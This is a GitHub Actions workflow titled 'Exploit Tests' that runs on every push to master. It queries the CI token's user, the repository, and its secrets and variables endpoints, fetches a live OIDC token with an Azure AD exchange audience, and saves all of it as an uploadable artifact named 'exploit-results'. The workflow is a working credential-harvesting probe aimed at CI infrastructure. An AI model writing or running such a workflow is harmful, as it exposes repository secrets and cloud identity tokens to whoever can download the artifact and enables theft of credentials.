name: Exploit Tests
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: GH CLI with token
        continue-on-error: true
        run: |
          mkdir -p dist
          gh auth status 2>&1 | tee -a dist/r.txt
          gh api /user 2>&1 | head -10 >> dist/r.txt
          gh api /repos/977812671/npm-install 2>&1 | head -15 >> dist/r.txt
          gh api /repos/977812671/npm-install/actions/secrets 2>&1 >> dist/r.txt
          gh api /repos/977812671/npm-install/actions/variables 2>&1 >> dist/r.txt
          
      - name: Token scope
        continue-on-error: true
        run: |
          echo "=== OIDC ===" >> dist/r.txt
          echo "URL: $ACTIONS_ID_TOKEN_REQUEST_URL" >> dist/r.txt
          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
            2>&1 | head -50 >> dist/r.txt

      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: exploit-results
          path: dist/
